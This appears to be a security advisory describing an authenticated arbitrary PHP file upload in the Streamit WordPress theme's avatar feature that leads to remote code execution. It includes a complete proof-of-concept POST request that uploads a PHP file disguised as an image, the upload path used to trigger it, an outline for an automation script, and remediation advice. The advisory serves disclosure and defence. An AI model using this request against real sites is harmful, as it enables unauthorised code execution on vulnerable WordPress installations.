🚀 Streamit WordPress Theme - Subscriber File Upload to RCE  
📌 Product Information  
Platform: WordPress (Theme: Streamit)  
Affected Feature: Profile Avatar Upload  
Tested Vulnerability: Arbitrary PHP File Upload (Subscriber+)  
CVE: Not Assigned  
Severity: High (Authenticated File Upload => Remote Code Execution)  
CWE ID: CWE-434  
CWE Name: Unrestricted Upload of File with Dangerous Type  
Patched: ❌ Not Applicable  
Patch Priority: 🔴 High  
Date Published: June 12, 2025  
Researcher: Grac3  
Link Product: https://themeforest.net/item/streamit-video-streaming-wordpress-theme/29772881  

⚠️ Summary of the Vulnerability  
The Streamit WordPress Theme allows logged-in users with *subscriber* role to change their avatar via the following endpoint:

example :
```
/membership-account/your-profile/?view=change-password
```

However, the form handling this request does not properly validate uploaded file types when the `update_avatar` action is set. By abusing this, attackers can upload PHP files disguised as images and trigger Remote Code Execution.

🧪 Proof of Concept (PoC)  
Sample POST Request:

```
POST /membership-account/your-profile/?view=change-password HTTP/2
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKW4qPnvjzFXSGYQM
Cookie: [VALID SUBSCRIBER COOKIE]

------WebKitFormBoundaryKW4qPnvjzFXSGYQM
Content-Disposition: form-data; name="user_avatar"; filename="bq.php"
Content-Type: image/jpeg

ÿØÿà
<?php echo 'HELLO WORLD'; ?>
------WebKitFormBoundaryKW4qPnvjzFXSGYQM
Content-Disposition: form-data; name="update_avatar"

Change
------WebKitFormBoundaryKW4qPnvjzFXSGYQM
Content-Disposition: form-data; name="_wpnonce"

[VALID_NONCE]
------WebKitFormBoundaryKW4qPnvjzFXSGYQM
Content-Disposition: form-data; name="_wp_http_referer"

/membership-account/your-profile/?view=change-password
------WebKitFormBoundaryKW4qPnvjzFXSGYQM
Content-Disposition: form-data; name="action"

update-avatar
------WebKitFormBoundaryKW4qPnvjzFXSGYQM--
```

📁 File Upload Behavior  
- The uploaded file must include the parameter `update_avatar` to be processed.
- Upon success, the file is saved in:

```
/wp-content/uploads/[year]/[month]/bq.php
```

✅ Indicators of Success:
- Status HTTP/2 200 OK
- Visiting `/wp-content/uploads/2025/06/bq.php` will execute the payload and print `HELLO WORLD`.

🔍 Where’s the Flaw?
- The file type is only superficially validated by MIME type.
- No server-side checks to restrict executable file types (like `.php`).
- Action `update_avatar` allows upload without checking user capabilities beyond basic authentication.

🔐 Recommendation  
- Enforce strict MIME and extension checks server-side for file uploads.
- Restrict `update-avatar` functionality to roles above Subscriber.
- Disallow `.php`, `.phtml`, and similar dangerous file types explicitly.
- Monitor and log all uploads, especially in `/wp-content/uploads`.

📁 Script Features (Optional)  
You may create a Python script to:
- Authenticate as a Subscriber.
- Upload a PHP payload via avatar change.
- Automatically retrieve uploaded path.
- Trigger uploaded file and verify execution.

⚠️ Disclaimer  
This information is provided for **educational and authorized testing** purposes only.  
**Do not** use it on systems without proper authorization.  
Unauthorized exploitation is illegal and unethical.
